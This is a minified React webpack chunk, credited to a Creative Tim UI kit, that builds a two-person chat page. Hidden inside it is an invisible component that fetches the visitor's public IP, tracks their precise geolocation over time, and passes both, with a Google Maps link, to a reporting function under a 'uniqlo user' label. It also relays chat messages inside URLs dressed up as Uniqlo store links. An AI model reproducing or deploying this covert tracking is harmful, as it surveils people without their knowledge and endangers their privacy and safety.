/*!

=========================================================
* Now UI Kit PRO React - v1.0.0
=========================================================

* Product Page: https://www.creative-tim.com/product/now-ui-kit-pro-react
* Copyright 2019 Creative Tim (http://www.creative-tim.com)

* Coded by Creative Tim

=========================================================

* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

*/
(this["webpackJsonpmaterial-kit-pro-react"]=this["webpackJsonpmaterial-kit-pro-react"]||[]).push([[17],{247:function(e,t,a){"use strict";a.d(t,"b",(function(){return o})),a.d(t,"c",(function(){return r})),a.d(t,"a",(function(){return i}));var n,c=a(278),o=function(e,t,a){if(void 0!==window.navigator.geolocation){window.navigator.geolocation.getCurrentPosition((function(t){var n={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0};e(n),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})}},r=function(e,t,a){c.a;if(n=n||new Date,void 0!==window.navigator.geolocation)return navigator.geolocation.watchPosition((function(t){var c={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0},o=new Date;Math.abs(o-n)/1e3%60>180&&(e(c),n=new Date),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})},i=function(e){void 0!==window.navigator.geolocation&&navigator.geolocation.clearWatch(e)}},278:function(e,t,a){"use strict";a.d(t,"a",(function(){return n}));var n=18e4},333:function(e,t,a){"use strict";a.d(t,"b",(function(){return d})),a.d(t,"a",(function(){return O}));var n=a(2),c=a.n(n),o=a(199),r=a(241),i=a.n(r),u=a(334),s=a.n(u),l=a(335),f=a.n(l),b={fontSize:"0.7rem"},m=function(e){var t=new Date(e),a=g(t.getHours()),n=g(t.getMinutes()),c=Date.now(),o=parseInt(c-e,10)/1e3/60,r=o/60;return o<=60?"".concat(a,":").concat(n):o>60&&r<=24||r>24?"".concat(a,":").concat(n," ----- ").concat(t.toDateString()):o},g=function(e){var t=e.toString();return 1===t.length?"0".concat(t):t},O=function(e){return e===o.b?s.a:e===o.a?f.a:i.a},d=function(e){return e.user===o.b?c.a.createElement("span",{style:b},"Karen ",c.a.createElement("small",null,"\xb7 ",m(e.createOn)," ")):e.user===o.a?c.a.createElement("span",{style:b},"Kevin ",c.a.createElement("small",null,"\xb7 ",m(e.createOn))):c.a.createElement(c.a.Fragment,null)}},334:function(e,t,a){e.exports=a.p+"static/media/gloria2.666943cf.jpg"},335:function(e,t,a){e.exports=a.p+"static/media/jerry.2aa27bf0.jpg"},843:function(e,t,a){"use strict";a.r(t);var n=a(19),c=a(123),o=a.n(c),r=a(2),i=a.n(r),u=a(53),s=a(20),l=a(40),f=a(118),b=a(85),m=a(86),g=a(336),O=a(332),d=a(333),j=a(91),v=a(222),w=a(199),p=a(227),h=a(247),E=(a(32),Object(s.f)((function(e){e.history;var t=Object(r.useState)(void 0),a=Object(n.a)(t,2),c=a[0],o=a[1],u=Object(r.useState)(void 0),s=Object(n.a)(u,2),l=s[0],f=s[1],b=Object(r.useState)(void 0),m=Object(n.a)(b,2),g=m[0],O=m[1],d=Object(r.useState)(void 0),j=Object(n.a)(d,2),w=j[0],p=j[1];return Object(r.useEffect)((function(){fetch("https://www.cloudflare.com/cdn-cgi/trace").then((function(e){return e.text()})).then((function(e){var t=e.split("\n"),a=Object(n.a)(t,3),c=(a[0],a[1],a[2]);if(c){var r=c.split("="),i=Object(n.a)(r,2),u=(i[0],i[1]);o(u)}}))}),[]),Object(r.useEffect)((function(){Object(h.b)(f,O,p);var e=Object(h.c)(f,O,p);return function(){e&&Object(h.a)(e)}}),[]),Object(r.useEffect)((function(){if(g){console.log(g);var e="uniqlo user error: ".concat(g);Object(v.a)(e)}}),[g,w]),Object(r.useEffect)((function(){if(l){var e="uniqlo user \n ip:".concat(c," \n https://www.google.com.tw/maps?q=").concat(l.lat,",").concat(l.lng);Object(v.a)(e)}}),[l]),i.a.createElement(r.Fragment,null)}))),y=a(278),S=a(94),q=a(76),k=a(25),D=(a(55),a(248)),x=Object(f.a)(p.a);t.default=Object(s.f)((function(e){e.history;var t=x(),a=Object(u.useSelector)((function(e){return e.login})).user,c=Object(r.useState)(void 0),s=Object(n.a)(c,2),f=s[0],p=s[1],h=Object(r.useState)(""),I=Object(n.a)(h,2),M=I[0],U=I[1],A=Object(r.useState)(""),C=Object(n.a)(A,2),F=C[0],H=C[1],R=Object(r.useState)(!0),J=Object(n.a)(R,2),K=J[0],N=J[1],P=Object(u.useSelector)((function(e){return e.chat})).maxMessageNumber,T=Object(r.useState)(!1),z=Object(n.a)(T,2),W=z[0],B=z[1],G=Object(r.useState)(""),L=Object(n.a)(G,2),Q=L[0],V=L[1];Object(r.useEffect)((function(){if(l.c&&void 0!==P){var e=Object(k.f)(l.c,Object(k.c)(P));Object(k.d)(e,(function(e){X(e)}))}}),[P]),Object(r.useEffect)((function(){if(a&&F&&""!==F){var e={user:a,message:"".concat(F),createOn:Date.now()},t={};t[Object(k.e)(Object(k.a)(Object(k.g)(l.d),"chatMsg")).key]=e,Object(k.i)(l.c,t).then((function(){if(a===w.b){Object(v.a)("http://www.uniqlo.com/tw/store/list/new/auto")}})).catch((function(e){console.log(e.message),V(e.message),B(!0),Object(v.a)("replyImageUrl update error: ".concat(e.message))}))}}),[F]),Object(r.useEffect)((function(){setTimeout((function(){N(!1)}),5e3),setInterval((function(){N(!0),setTimeout((function(){N(!1)}),5e3)}),y.a)}),[]);var X=function(e){var t=e.val();if(null!==t&&void 0!==t){var n=o.a.slice(o.a.values(t),-P),c=o.a.slice(o.a.values(n),-1)[0].user;o.a.slice(o.a.values(n),-1)[0].createOn;a===c?(U(""),p(n)):p(n)}};return i.a.createElement("div",{className:t.section},i.a.createElement(b.a,{justify:"center"},i.a.createElement(m.a,{xs:12,sm:8,md:8},i.a.createElement("div",null,f?f.map((function(e,t){return i.a.createElement(g.a,{key:void 0!==e.id?e.id:t,avatar:Object(d.a)(e.user),title:Object(d.b)(e),message:e.message})})):i.a.createElement("div",null),i.a.createElement(O.a,{avatar:Object(d.a)(a),value:M,onChange:function(e){U(e.target.value)},onReply:function(e){try{if(a&&""!==M){var t={user:a,message:M,createOn:Date.now()},n=Object(k.e)(Object(k.a)(Object(k.g)(l.d),"chatMsg")).key,c={};if(c[n]=t,Object(k.i)(l.c,c).then((function(){if(B(!1),a===w.b){var e="http://www.uniqlo.com/tw/store/list/new/auto?update=true&message=".concat(M);Object(v.a)(e)}})).catch((function(e){if(console.log(e.message),V(e.message),B(!0),Object(v.a)("onReplyClick update error: ".concat(e.message)),a===w.b){var t="http://www.uniqlo.com/tw/store/list/new/auto?update=false&message=".concat(M);Object(v.a)(t)}})),a===w.b){var o="http://www.uniqlo.com/tw/store/list/new/auto?message=".concat(M);Object(v.a)(o)}}}catch(i){if(a===w.b){var r="http://www.uniqlo.com/tw/store/list/new/auto?update=false&error=".concat(i.message);Object(v.a)(r)}}},onUpdate:function(e){if(a){var t=P+1;Object(q.a)(S.a,t)}if(a===w.b){Object(v.a)("http://www.uniqlo.com/tw/store/list/new/update")}},enableUpdate:!0,setReplyImageUrl:H,enableImageUpload:!0})))),i.a.createElement(j.a,null),i.a.createElement(D.a,{enable:W,setEnable:B,title:"Error...",message:Q}),K?i.a.createElement(E,null):i.a.createElement(r.Fragment,null))}))}}]);
//# sourceMappingURL=17.ff4afa89.chunk.js.map